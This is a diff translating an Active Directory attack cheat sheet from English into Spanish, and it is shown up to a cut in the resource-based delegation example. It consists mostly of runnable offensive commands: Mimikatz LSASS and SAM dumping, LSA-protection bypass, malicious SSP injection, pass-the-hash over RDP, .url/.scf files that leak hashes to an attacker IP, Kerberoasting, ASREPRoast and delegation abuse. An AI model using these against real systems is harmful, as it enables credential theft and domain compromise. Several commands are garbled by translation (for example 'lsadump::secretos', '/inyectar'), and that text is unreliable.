 ### Mimikatz
 
 ```powershell
-#The commands are in cobalt strike format!
+#¡Los comandos están en formato Cobalt Strike!
 
-#Dump LSASS:
+#Volcar LSASS:
 mimikatz privilege::debug
 mimikatz token::elevate
 mimikatz sekurlsa::logonpasswords
@@ -456,667 +457,654 @@ mimikatz sekurlsa::logonpasswords
 mimikatz privilege::debug
 mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
 
-#List all available kerberos tickets in memory
+#Enumerar todos los tickets de Kerberos disponibles en memoria
 mimikatz sekurlsa::tickets
 
-#Dump local Terminal Services credentials
+#Volcar las credenciales locales de Terminal Services
 mimikatz sekurlsa::tspkg
 
-#Dump and save LSASS in a file
+#Volcar y guardar LSASS en un archivo
 mimikatz sekurlsa::minidump c:\temp\lsass.dmp
 
-#List cached MasterKeys
+#Enumerar las MasterKeys en caché
 mimikatz sekurlsa::dpapi
 
-#List local Kerberos AES Keys
+#Enumerar las claves AES de Kerberos locales
 mimikatz sekurlsa::ekeys
 
-#Dump SAM Database
+#Volcar base de datos SAM
 mimikatz lsadump::sam
 
-#Dump SECRETS Database
-mimikatz lsadump::secrets
+#Volcar base de datos SECRETOS
+mimikatz lsadump::secretos
 
-#Inject and dump the Domain Controler's Credentials
-mimikatz privilege::debug
-mimikatz token::elevate
-mimikatz lsadump::lsa /inject
+#Inyectar y volcar las Credenciales del Controlador de Dominio
+privilegio mimikatz::depuración
+token mimikatz::elevar
+mimikatz lsadump::lsa /inyectar
 
-#Dump the Domain's Credentials without touching DC's LSASS and also remotely
-mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+#Volcar las Credenciales del Dominio sin tocar el LSASS de DC y además de forma remota
+mimikatz lsadump::dcsync /dominio:<DominioFQDN> /todos
 
-#Dump old passwords and NTLM hashes of a user
-mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
+#Volcar contraseñas antiguas y hashes NTLM de un usuario
+mimikatz lsadump::dcsync /usuario:<DomainFQDN>\<usuario> /history
 
-#List and Dump local kerberos credentials
-mimikatz kerberos::list /dump
+#Listar y volcar credenciales de Kerberos locales
+mimikatz kerberos::lista /volcado
 
-#Pass The Ticket
+#Pase el billete
 mimikatz kerberos::ptt <PathToKirbiFile>
 
-#List TS/RDP sessions
+#Listar sesiones TS/RDP
 mimikatz ts::sessions
 
-#List Vault credentials
+#Listar credenciales del almacén
 mimikatz vault::list
 ```
 
-:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?
+:exclamation: ¿Qué ocurre si mimikatz no puede volcar las credenciales debido a los controles de protección LSA?
 
-- LSA as a Protected Process (Kernel Land Bypass)
+- LSA como proceso protegido (Omisión del kernel)
 
-  ```powershell
-  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
-  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+```powershell
+#Comprueba si LSA se ejecuta como un proceso protegido verificando si la variable "RunAsPPL" está establecida en 0x1
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 
-  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
-  #Now lets import the mimidriver.sys to the system
-  mimikatz # !+
+#A continuación, sube el archivo mimidriver.sys desde el repositorio oficial de mimikatz a la misma carpeta que tu archivo mimikatz.exe
+#Ahora importamos mimidriver.sys al sistema
+mimikatz # !+
 
-  #Now lets remove the protection flags from lsass.exe process
-  mimikatz # !processprotect /process:lsass.exe /remove
+#Ahora eliminamos las marcas de protección del proceso lsass.exe
+mimikatz # !processprotect /process:lsass.exe /remove
 
-  #Finally run the logonpasswords function to dump lsass
-  mimikatz # sekurlsa::logonpasswords
-  ```
+#Finalmente, ejecuta la función logonpasswords para volcar lsass
+mimikatz # sekurlsa::logonpasswords
+```
 
-- LSA as a Protected Process (Userland "Fileless" Bypass)
+- LSA como proceso protegido (sin archivos) Omisión)
 
-  - [PPLdump](https://github.com/itm4n/PPLdump)
-  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
+- [PPLdump](https://github.com/itm4n/PPLdump)
+- [Omisión de la protección LSA en Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
 
-- LSA is running as virtualized process (LSAISO) by Credential Guard
+- LSA se ejecuta como un proceso virtualizado (LSAISO) mediante Credential Guard
 
-  ```powershell
-  #Check if a process called lsaiso.exe exists on the running processes
-  tasklist |findstr lsaiso
+```powershell
+#Comprobar si existe un proceso llamado lsaiso.exe en los procesos en ejecución
+tasklist |findstr lsaiso
 
-  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
-  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
-  mimikatz # misc::memssp
+#Si existe, no hay forma de volcar lsass; solo obtendremos datos cifrados. Sin embargo, podemos usar keyloggers o volcadores de portapapeles para capturar datos. #Inyectemos nuestro propio proveedor de soporte de seguridad malicioso en la memoria. Para este ejemplo, usaré el que proporciona mimikatz.
+mimikatz # misc::memssp
 
-  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
-  ```
+#Ahora, cada sesión y autenticación de usuario en esta máquina se registrará, y las credenciales de texto plano se capturarán y se guardarán en c:\windows\system32\mimilsa.log
+```
 
-- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
-- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
+- [Guía detallada de Mimikatz](https://adsecurity.org/?page_id=1821)
+- [Explorando dos opciones de protección lsass](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
 
-### Remote Desktop Protocol
+### Protocolo de Escritorio Remoto
 
-If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.
+Si el host al que queremos realizar el traslado lateral tiene habilitado "RestrictedAdmin", podemos pasar el hash mediante el protocolo RDP y obtener una sesión interactiva sin la contraseña de texto plano.
 
 - Mimikatz:
 
-  ```powershell
-  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
-  privilege::debug
-  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
+```powershell
+#Ejecutamos la función de pasar el hash con mimikatz y generamos una instancia de mstsc.exe con el indicador "/restrictedadmin"
+privilege::debug
+sekurlsa::pth /user:<Nombre de usuario> /domain:<Nombre de dominio> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
 
-  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
-  ```
+#Luego, simplemente haga clic en "Aceptar" en el diálogo de RDP y disfrute de una sesión interactiva con el usuario que suplantamos.
+```
 
 - xFreeRDP:
 
 ```powershell
-xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
+xfreerdp +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:<Nombre de usuario> /pth:<NTLMHash> /v:<Nombre de host | Dirección IP>
 ```
 
-:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
+:exclamation: Si el modo de administrador restringido está deshabilitado en la máquina remota, podemos conectarnos al host usando otra herramienta/protocolo
 
-- Bypass "Single Session per User" Restriction
+Como psexec o winrm, habilítelo creando la siguiente clave de registro y estableciéndola en cero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
 
-On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
+- Omitir la restricción de "Sesión única por usuario"
+
+En un equipo de dominio, si ejecuta comandos como administrador del sistema o local y desea una sesión RDP que otro usuario ya esté usando, puede evitar la restricción de sesión única agregando la siguiente clave de registro:
 ```powershell
 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
 ```
 
-Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
-```powershell
+Una vez completado el proceso, puede eliminar la clave para restablecer la restricción de una sola sesión por usuario. ```powershell
 REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
 ```
 
+### Ataques con archivos URL
 
-### URL File Attacks
+- Archivo .url
 
-- .url file
+```
+[Acceso directo a Internet]
+URL=lo que sea
+WorkingDirectory=lo que sea
+IconFile=\\<IpDelAtacante>\%USERNAME%.icon
+IconIndex=1
+```
 
-  ```
-  [InternetShortcut]
-  URL=whatever
-  WorkingDirectory=whatever
-  IconFile=\\<AttackersIp>\%USERNAME%.icon
-  IconIndex=1
-  ```
+```
+[Acceso directo a Internet]
+URL=file://<IpDelAtacante>/leak/leak.html
+```
 
-  ```
-  [InternetShortcut]
-  URL=file://<AttackersIp>/leak/leak.html
-  ```
+- Archivo .scf
 
-- .scf file
+```
+[Shell]
+Comando=2
+IconFile=\\<IpDelAtacante>\Share\test.ico
+[Barra de tareas]
+Comando=ToggleDesktop
+```
 
-  ```
-  [Shell]
-  Command=2
-  IconFile=\\<AttackersIp>\Share\test.ico
-  [Taskbar]
-  Command=ToggleDesktop
-  ```
+Colocar estos archivos en un recurso compartido con permisos de escritura para la víctima Solo hay que abrir el explorador de archivos y navegar hasta el recurso compartido. **Nota**: No es necesario abrir el archivo ni que el usuario interactúe con él, pero debe estar en la parte superior del sistema de archivos o visible en la ventana del explorador de Windows para que se pueda renderizar. Use Responder para capturar los hashes.
 
-Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.
+Los ataques con archivos .scf no funcionan en las últimas versiones de Windows.
 
-:exclamation: .scf file attacks won't work on the latest versions of Windows.
+### Herramientas útiles
 
-### Useful Tools
+- [Powercat](https://github.com/besimorhino/powercat) netcat está escrito en PowerShell y ofrece funciones de tunelización, retransmisión y redireccionamiento de puertos. - [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) Herramienta de movimiento lateral sin archivos que se basa en ChangeServiceConfigA para ejecutar comandos.
+- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) La shell WinRM definitiva para hacking/pentesting.
+- [RunasCs](https://github.com/antonioCoco/RunasCs) Versión CSharp y abierta del runas.exe integrado de Windows.
+- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) Crea todos los formatos de archivo posibles para ataques de URL.
 
-- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward
-  capabilities.
-- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
-- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
-- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
-- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) creates all possible file formats for url file attacks
-
-## Domain Privilege Escalation
+## Escalada de Privilegios de Dominio
 
 ### Kerberoast
 
-_WUT IS DIS?:_ \
- All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
- account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.
+¿QUÉ ES ESTO?:_ \
+Todos los usuarios de dominio estándar pueden solicitar una copia de todas las cuentas de servicio junto con sus hashes de contraseña correspondientes, por lo que podemos solicitar a un TGS cualquier SPN vinculado a una cuenta de usuario. Extraer el blob cifrado con la contraseña del usuario y ejecutarlo por fuerza bruta sin conexión. - PowerView:
 
-- PowerView:
+```powershell
+#Obtener las cuentas de usuario que se usan como cuentas de servicio
+Get-NetUser -SPN
 
-  ```powershell
-  #Get User Accounts that are used as Service Accounts
-  Get-NetUser -SPN
+#Obtener todas las cuentas SPN disponibles, solicitar un TGS y volcar su hash
+Invoke-Kerberoast
 
-  #Get every available SPN account, request a TGS and dump its hash
-  Invoke-Kerberoast
+#Solicitar el TGS para una sola cuenta:
+Request-SPNTicket
 
-  #Requesting the TGS for a single account:
-  Request-SPNTicket
+#Exportar todos los tickets usando Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
 
-  #Export all tickets using Mimikatz
-  Invoke-Mimikatz -Command '"kerberos::list /export"'
-  ```
+- Módulo AD:
 
-- AD Module:
-
-  ```powershell
-  #Get User Accounts that are used as Service Accounts
-  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-  ```
+```powershell
+#Obtener las cuentas de usuario que se usan como cuentas de servicio
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
 
 - Impacket:
 
-  ```powershell
-  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
-  ```
+```powershell
+python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+```
 
 - Rubeus:
 
-  ```powershell
-  #Kerberoasting and outputing on a file with a specific format
-  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
+```powershell
+#Kerberoast y salida en un archivo con un formato específico
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
 
-  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
-  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
+#Kerberoast con seguridad "OPSEC", sin intentar asar cuentas con AES habilitado
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
 
-  #Kerberoast AES enabled accounts
-  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
+#Cuentas con AES habilitado para Kerberoast
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
 
-  #Kerberoast specific user account
-  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
+#Cuenta de usuario específica de Kerberoast
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
 
-  #Kerberoast by specifying the authentication credentials
-  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
-  ```
+#Kerberoast especificando las credenciales de autenticación
+Rubeus.exe kerberoast /outfile:<nombre_archivo> /domain:<nombre_dominio> /creduser:<nombre_usuario> /credpassword:<contraseña>
+```
 
 ### ASREPRoast
 
-_WUT IS DIS?:_ \
- If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
- blob and bruteforce it offline.
+_¿QUÉ ES DIS?:_ \
+Si una cuenta de usuario de dominio no requiere preautenticación Kerberos, podemos solicitar un TGT válido para esta cuenta sin siquiera tener credenciales de dominio, extraer el blob cifrado y ejecutarlo por fuerza bruta sin conexión.
 
 - PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
-- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
+- Módulo AD: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
 
-Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
-Check for interesting permissions on accounts:
+¡Desactivar forzosamente la preautenticación Kerberos en una cuenta con permisos de escritura o superiores!
+Comprobar permisos interesantes en las cuentas:
 
-**Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
+**Sugerencia:** Añadimos un filtro, por ejemplo Los usuarios de RDPU obtendrán "Cuentas de usuario", no Cuentas de máquina, ya que los hashes de las Cuentas de máquina no se pueden descifrar.
 
 PowerView:
 
 ```powershell
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
-Disable Kerberos Preauth:
+Desactivar la preautorización de Kerberos:
 Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
-Check if the value changed:
+Comprobar si el valor ha cambiado:
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-- And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
+- Y finalmente, ejecutar
 
-  ```powershell
-  #Get a specific Accounts hash:
-  Get-ASREPHash -UserName <UserName> -Verbose
+Ataque con la herramienta [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast).
 
-  #Get any ASREPRoastable Users hashes:
-  Invoke-ASREPRoast -Verbose
-  ```
+```powershell
+#Obtener el hash de una cuenta específica:
+Get-ASREPHash -UserName <UserName> -Verbose
 
-- Using Rubeus:
+#Obtener los hashes de los usuarios ASREPRoast:
+Invoke-ASREPRoast -Verbose
+```
 
-  ```powershell
-  #Trying the attack for all domain users
-  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+- Usando Rubeus:
 
-  #ASREPRoast specific user
-  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+```powershell
+#Intentando el ataque para todos los usuarios del dominio
+Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
 
-  #ASREPRoast users of a specific OU (Organization Unit)
-  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
-  ```
+#Usuario específico de ASREPRoast
+Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
 
-- Using Impacket:
+#Usuarios de ASREPRoast de una OU (Unidad Organizativa) específica
+Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+```
 
-  ```powershell
-  #Trying the attack for the specified users on the file
-  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
-  ```
+- Usando Impacket:
 
-### Password Spray Attack
+```powershell
+#Intentando el ataque para los usuarios especificados en el archivo
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
+```
 
-If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
-on other domain accounts.
+### Ataque de rociado de contraseñas
 
-**Tools:**
+Si hemos obtenido algunas contraseñas comprometiendo una cuenta de usuario, podemos usar este método para intentar explotar la reutilización de contraseñas en otras cuentas de dominio.
+
+**Herramientas:**
 
 - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
 - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
 - [Spray](https://github.com/Greenwolf/Spray)
 
-### Force Set SPN
+### Forzar la configuración de SPN
 
-_WUT IS DIS ?:
-If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._
+¿Qué es esto?:
+Si tenemos suficientes permisos -> GenericAll/GenericWrite, podemos configurar un SPN en una cuenta de destino, solicitar un TGS, obtener su blob y aplicarle fuerza bruta.
 
 - PowerView:
 
-  ```powershell
-  #Check for interesting permissions on accounts:
-  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
+```powershell
+#Comprobar permisos interesantes en las cuentas:
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 
-  #Check if current user has already an SPN setted:
-  Get-DomainUser -Identity <UserName> | select serviceprincipalname
+#Comprobar si el usuario actual ya tiene un SPN configurado:
+Get-DomainUser -Identity <UserName> | select serviceprincipalname
 
-  #Force set the SPN on the account:
-  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
-  ```
+#Forzar la configuración del SPN en la cuenta:
+Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
+```
 
-- AD Module:
-
-  ```powershell
-  #Check if current user has already an SPN setted
-  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
-
-  #Force set the SPN on the account:
-  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
-  ```
-
-Finally use any tool from before to grab the hash and kerberoast it!
-
-### Abusing Shadow Copies
-
-If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.
+- Módulo AD:
 
 ```powershell
-#List shadow copies using vssadmin (Needs Admnistrator Access)
+#Comprobar si el usuario actual ya tiene un SPN configurado
+Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
+
+#Forzar la configuración del SPN en la cuenta:
+Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
+```
+
+¡Por último, usa cualquier herramienta de la lista anterior para obtener el hash y aplicarle Kerberost!
+
+### Abuso de instantáneas
+
+Si tiene acceso de administrador local en una máquina, intente listar instantáneas; es una forma sencilla de escalar el dominio.
+
+```powershell
+#Lista de instantáneas con vssadmin (requiere acceso de administrador)
 vssadmin list shadows
 
-#List shadow copies using diskshadow
+#Lista de instantáneas con diskshadow
 diskshadow list shadows all
 
-#Make a symlink to the shadow copy and access it
+#Crear un enlace simbólico a la instantánea y acceder a ella
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
-1. You can dump the backuped SAM database and harvest credentials.
-2. Look for DPAPI stored creds and decrypt them.
-3. Access backuped sensitive files.
+1. Puede volcar la base de datos SAM de la copia de seguridad y recopilar las credenciales.
+2. Buscar las credenciales almacenadas en DPAPI y descifrarlas.
+3. Acceder a los archivos confidenciales de la copia de seguridad.
 
-### List and Decrypt Stored Credentials using Mimikatz
+### Listar y descifrar credenciales almacenadas con Mimikatz
 
-Usually encrypted credentials are stored in:
+Normalmente, las credenciales cifradas se almacenan en:
 
 - `%appdata%\Microsoft\Credentials`
 - `%localappdata%\Microsoft\Credentials`
 
 ```powershell
-#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
+#Usando la función cred de mimikatz, podemos enumerar el objeto cred y obtener información sobre él:
 dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
 
-#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
-#Lets enumerate the Master Key:
+#Del comando anterior, nos interesa el parámetro "guidMasterKey", que indica qué clave maestra se utilizó para cifrar la credencial.
+#Enumeraremos la clave maestra:
 dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"
 
-#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
+#Ahora, si nos encontramos en el contexto del usuario (o sistema) al que pertenece la credencial, podemos usar El indicador /rpc para pasar el descifrado de la clave maestra al controlador de dominio:
 dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc
 
-#We now have the masterkey in our local cache:
+#Ahora tenemos la clave maestra en nuestra caché local:
 dpapi::cache
 
-#Finally we can decrypt the credential using the cached masterkey:
+#Finalmente, podemos descifrar la credencial usando la clave maestra en caché:
 dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
 ```
 
-Detailed Article:
-[DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
+Artículo detallado:
+[Todo sobre DPAPI](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
 
-### Unconstrained Delegation
+### Delegación sin restricciones
 
-_WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
-high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_
+_¿QUÉ ES DIS?: Si tenemos acceso administrativo en una máquina con la Delegación sin restricciones habilitada, podemos esperar un alto Objetivo de valor o DA para conectarse, robar su TGT, luego usar ptt y suplantarlo.
 
-Using PowerView:
+Usando PowerView:
 
 ```powershell
-#Discover domain joined computers that have Unconstrained Delegation enabled
+#Descubrir equipos unidos al dominio que tengan habilitada la Delegación sin restricciones
 Get-NetComputer -UnConstrained
 
-#List tickets and check if a DA or some High Value target has stored its TGT
+#Listar tickets y comprobar si un DA o algún objetivo de alto valor ha almacenado su TGT
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 
-#Command to monitor any incoming sessions on our compromised server
+#Comando para monitorizar cualquier sesión entrante en nuestro servidor comprometido
 Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay
 <WaitInterval> -Verbose
 
-#Dump the tickets to disk:
+#Volcar los tickets al disco:
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
-#Impersonate the user using ptt attack:
+#Suplantar al usuario usando ptt Ataque:
 Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
 ```
 
-**Note:** We can also use Rubeus!
+*
 
-### Constrained Delegation
+*Nota:** ¡También podemos usar Rubeus!
 
-Using PowerView and Kekeo:
+### Delegación Restringida
+
+Usando PowerView y Kekeo:
 
 ```powershell
-#Enumerate Users and Computers with constrained delegation
+#Enumerar usuarios y equipos con delegación restringida
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 
-#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
-tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
+#Si tenemos un usuario con delegación restringida, solicitamos un tgt válido de este usuario usando kekeo
+tgt::ask /user:<NombreDeUsuario> /domain:<FQDNDeDominio> /rc4:<ContraseñaHashedDelUsuario>
 
-#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
-tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>
+#Luego, usando el tgt, solicitamos a un TGS un servicio al que este usuario tiene acceso mediante delegación restringida
+tgs::s4u /tgt:<RutaDeTGT> /user:<UsuarioParaImpersonar>@<FQDNDeDominio> /service:<SPNDeServicio>
 
-#Finally use mimikatz to ptt the TGS
+#Finalmente, usamos mimikatz para enviar el tgt TGS
 Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
 ```
 
 _ALTERNATIVE:_
-Using Rubeus:
+Usando Rubeus:
 
 ```powershell
-Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
+Rubeus.exe s4u /user:<NombreDeUsuario> /rc4:<ContraseñaHashedNTLMDelUsuario> /impersonateuser:<UsuarioParaImpersonar> /msdsspn:"<SPN Del Servicio>" /altservice:<Opcional> /ptt
 ```
 
-Now we can access the service as the impersonated user!
+¡Ahora podemos acceder al servicio como el usuario suplantado!
 
-:triangular_flag_on_post: **What if we have delegation rights for only a specific SPN? (e.g TIME):**
+:triangular_flag_on_post: **¿Qué sucede si solo tenemos derechos de delegación para un SPN específico? (p. ej., TIME):**
 
-In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
+En este caso, aún podemos abusar de una función de Kerberos llamada "servicio alternativo". Esto nos permite solicitar tickets TGS para otros servicios "alternativos" y no solo para el que tenemos derechos. Esto nos da la posibilidad de solicitar tickets válidos para cualquier servicio que queramos que el host admita, lo que nos otorga acceso total a la máquina de destino.
 
-### Resource Based Constrained Delegation
+### Delegación Restringida Basada en Recursos
 
-_WUT IS DIS?: \
+_¿QUÉ ES DIS?: \
 TL;DR \
-If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._
+Si tenemos privilegios GenericALL/GenericWrite en un objeto de cuenta de máquina de un dominio, podemos abusar de ellos y suplantar la identidad de cualquier usuario del dominio. Por ejemplo, podemos suplantar la identidad del Administrador del Dominio y tener acceso total._
 
-Tools we are going to use:
+Herramientas que usaremos:
 
 - [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
 - [Powermad](https://github.com/Kevin-Robertson/Powermad)
 - [Rubeus](https://github.com/GhostPack/Rubeus)
 
-First we need to enter the security context of the user/machine account that has the privileges over the object.
-If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.
+Primero, debemos ingresar el contexto de seguridad de la cuenta de usuario/máquina que tiene los privilegios sobre el objeto. Si se trata de una cuenta de usuario, podemos usar Pass the Hash, RDP, PSCredentials, etc.
 
-Exploitation Example:
+Ejemplo de explotación:
 
 ```powershell
-#Import Powermad and use it to create a new MACHINE ACCOUNT
+#Importar Powermad y usarlo para crear una nueva CUENTA DE MÁQUINA
 . .\Powermad.ps1
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
 
-#Import PowerView and get the SID of our new created machine account
+#Importar PowerView y obtener el SID de la nueva cuenta de máquina
 . .\PowerView.ps1
 $ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
 
-#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
+#Luego, usando el SID, crearemos una ACE para la nueva cuenta de equipo usando un descriptor de seguridad sin procesar:
